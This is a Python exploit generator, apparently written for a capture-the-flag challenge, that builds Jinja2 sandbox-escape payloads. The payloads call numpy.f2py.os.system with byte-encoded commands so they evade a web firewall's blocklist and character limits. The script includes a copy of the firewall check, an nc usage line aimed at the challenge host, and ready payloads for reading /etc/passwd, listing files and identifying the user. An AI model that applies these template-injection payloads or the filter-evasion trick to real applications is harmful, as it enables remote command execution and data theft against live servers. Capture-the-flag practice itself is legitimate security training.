#!/usr/bin/env python3
"""
CTF Exploit Generator for Jinja2 Sandbox Escape Challenge
Uses numpy.f2py.os.system with numpy.bytes_ to bypass WAF
"""

def generate_payload(cmd):
    """Generate a WAF-bypassing payload for the given command"""
    bytes_list = [ord(c) for c in cmd]
    return f'{{{{ numpy.f2py.os.system(numpy.bytes_({bytes_list})) }}}}'

def check_waf(payload):
    """Verify payload passes WAF"""
    import string
    from collections import Counter
    
    allowlist = set(string.ascii_lowercase + string.ascii_uppercase + string.punctuation + string.digits + ' ')
    blocklist = ['fromfile', 'savetxt', 'load', 'array', 'packbits', 'ctypes', 'eval', 'exec', 'breakpoint', 'input', '+', '-', '/', '\\', '|', '"', "'"]
    char_limits = {'(': 3, ')': 3, '[': 3, ']': 3, '{': 3, '}': 3, ',': 10}
    
    # Length check
    if len(payload) > 275:
        return False, f"Too long: {len(payload)} > 275"
    
    # Allowlist check
    for ch in payload:
        if ch not in allowlist:
            return False, f"Invalid char: {repr(ch)}"
    
    # Blocklist check
    lower_val = payload.lower()
    for blocked in blocklist:
        if blocked.lower() in lower_val:
            return False, f"Blocked term: {blocked}"
    
    # Char limits
    counter = Counter(ch for ch in payload if ch in char_limits)
    for ch, count in counter.items():
        if count > char_limits[ch]:
            return False, f"Char limit exceeded: {repr(ch)} = {count} > {char_limits[ch]}"
    
    return True, "OK"

if __name__ == "__main__":
    # Main payload for the flag
    flag_payload = generate_payload("/fix help")
    
    print("=" * 60)
    print("JINJA2 SANDBOX ESCAPE EXPLOIT")
    print("=" * 60)
    print()
    print("FLAG PAYLOAD:")
    print(flag_payload)
    print()
    
    ok, msg = check_waf(flag_payload)
    print(f"WAF Check: {msg}")
    print(f"Length: {len(flag_payload)}/275")
    print()
    print("USAGE:")
    print(f"echo '{flag_payload}' | nc challenges.1pc.tf 20334")
    print()
    print("=" * 60)
    print("OTHER USEFUL PAYLOADS:")
    print("=" * 60)
    
    commands = [
        ("List files", "ls"),
        ("Show /etc/passwd", "cat /etc/passwd"),
        ("Current user", "id"),
        ("Show processes", "ps"),
    ]
    
    for desc, cmd in commands:
        payload = generate_payload(cmd)
        ok, msg = check_waf(payload)
        print(f"\n{desc} ({cmd}):")
        print(payload)
        print(f"WAF: {msg}, Length: {len(payload)}")
